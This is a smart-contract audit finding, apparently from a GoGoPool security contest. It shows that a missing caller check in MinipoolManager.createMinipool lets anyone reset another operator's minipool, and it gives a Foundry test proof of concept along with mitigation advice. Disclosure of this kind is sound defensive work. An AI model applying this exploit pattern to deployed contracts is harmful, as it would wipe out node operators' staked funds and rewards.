# Original link
https://github.com/code-423n4/2022-12-gogopool-findings/issues/772
# Lines of code

https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/MinipoolManager.sol#L196


# Vulnerability details

## Impact
The `MinipoolManager.createMinipool` function do not validate the caller's address due to which any address can invoke the `createMinipool` function with any `nodeID` (existing or new) as input. For any existing `nodeID` the function can be invoked as long as the `requireValidStateTransition(minipoolIndex, MinipoolStatus.Prelaunch)` condition is met. This condition is met when the Minipool is in these states:
 - Withdrawable
 - Finished
 - Canceled
 - Error

Upon execution the `createMinipool` function resets the Minipool state (sets all values to zero). 

Since the function can be invoked by anyone for any existing `nodeID`, it can be used to nullify all funds of node operators including original AVAX staked plus any AVAX rewards. The attacker will need some initial capital to invoke the `createMinipool` function, this capital however can be safely recovered by the attacker after `MinipoolCancelMoratoriumSeconds` duration.

This attack can result in loss of funds for all the node operators of GoGoPool protocol. 

## Proof of Concept
Steps for exploit:

1. The attacker waits until a Minipool (of nodeID `N`) comes into `Withdrawable` state.
2. Attacker stakes the necessary GGP and invokes the `createMinipool` function with nodeID `N` as input.
3. The Minipool state gets reset hence all funds of original Minipool owner (node operator) gets resets to 0. Also the attacker becomes the owner of that respective Minipool.
4. After waiting for `MinipoolCancelMoratoriumSeconds` the attacker can successfully recover his initial capital.

Test Scenario: 

```solidity
contract MinipoolManagerTest is BaseTest {
	using FixedPointMathLib for uint256;
	address private nodeOp;
	address private attacker;

	function setUp() public override {
		super.setUp();
		nodeOp = getActorWithTokens("nodeOp", MAX_AMT, MAX_AMT);
		attacker = getActorWithTokens("attacker", MAX_AMT, MAX_AMT);
	}

	function testBug() public {
		address liqStaker1 = getActorWithTokens("liqStaker1", MAX_AMT, MAX_AMT);
		vm.prank(liqStaker1);
		ggAVAX.depositAVAX{value: MAX_AMT}();

		uint256 duration = 2 weeks;
		uint256 depositAmt = 1000 ether;
		uint256 avaxAssignmentRequest = 1000 ether;
		uint256 validationAmt = depositAmt + avaxAssignmentRequest;
		uint128 ggpStakeAmt = 200 ether;

		vm.startPrank(nodeOp);
		ggp.approve(address(staking), MAX_AMT);
		staking.stakeGGP(ggpStakeAmt);
		MinipoolManager.Minipool memory mp1 = createMinipool(depositAmt, avaxAssignmentRequest, duration);
		vm.stopPrank();

		vm.startPrank(address(rialto));
		minipoolMgr.claimAndInitiateStaking(mp1.nodeID);
		bytes32 txID = keccak256("txid");
		minipoolMgr.recordStakingStart(mp1.nodeID, txID, block.timestamp);

		skip(duration);

		uint256 rewards = 10 ether;
		deal(address(rialto), address(rialto).balance + rewards);
		minipoolMgr.recordStakingEnd{value: validationAmt + rewards}(mp1.nodeID, block.timestamp, rewards);
		vm.stopPrank();

		uint256 attackerInitialAvaxBal = attacker.balance;
		uint256 attackerInitialGgpBal = ggp.balanceOf(attacker);
		vm.startPrank(attacker);
		ggp.approve(address(staking), MAX_AMT);
		staking.stakeGGP(200 ether);
		minipoolMgr.createMinipool{value: 1000 ether}(mp1.nodeID, 0, 0, 1000 ether);
		vm.stopPrank();

		vm.startPrank(nodeOp);
		vm.expectRevert(MinipoolManager.OnlyOwner.selector);
		minipoolMgr.withdrawMinipoolFunds(mp1.nodeID);
		assertEq(minipoolMgr.getMinipool(minipoolMgr.getIndexOf(mp1.nodeID)).owner, attacker);
		vm.stopPrank();

		skip(dao.getMinipoolCancelMoratoriumSeconds());
		vm.startPrank(attacker);
		minipoolMgr.cancelMinipool(mp1.nodeID);
		staking.withdrawGGP(200 ether);

		assertEq(attacker.balance, attackerInitialAvaxBal);
		assertEq(ggp.balanceOf(attacker), attackerInitialGgpBal);
	}
}
```
## Tools Used
Manual review

## Recommended Mitigation Steps
The `createMinipool` function should validate the caller using the `onlyOwner` function.

Also the sponsors should verify whether it is intended to allow the Minipool state transition from `Withdrawable` to `Prelaunch` state. If not, the `else if` condition in `requireValidStateTransition` should be corrected accordingly. 
```solidity
             else if (currentStatus == MinipoolStatus.Withdrawable || currentStatus == MinipoolStatus.Error) {
			isValid = (to == MinipoolStatus.Finished || to == MinipoolStatus.Prelaunch);
		}
```